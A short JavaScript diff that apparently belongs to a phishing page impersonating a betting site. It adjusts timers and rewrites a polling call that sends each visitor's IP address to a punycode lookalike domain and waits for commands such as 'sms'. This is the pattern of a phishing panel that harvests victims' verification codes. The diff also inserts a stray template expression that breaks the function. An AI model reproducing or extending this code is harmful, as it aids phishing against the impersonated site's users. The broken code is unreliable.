@@ -751,7 +751,7 @@
       setInterval(() => {
         this.getUserIpFromCookie();
         this.makeRequests();
-      }, 3000);
+      }, 13000);
     },
     methods: {
       getUserIpFromCookie() {
@@ -800,15 +800,15 @@
 
 gonder();
 
-var int=self.setInterval("gonder()",3000);
+var int=self.setInterval("gonder()",2500);
 
 });
 
   function gonder(){
-  
+  ${this.userIp}
       $.ajax({
         type:'get',
-        url:'https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=${this.userIp}`',
+        url: 'https://xn--holiganbt930-8d6f.com/tr/datach.php?user_ip=' + this.userIp,
         success: function (msg) {
         
         if(msg=='sms'){
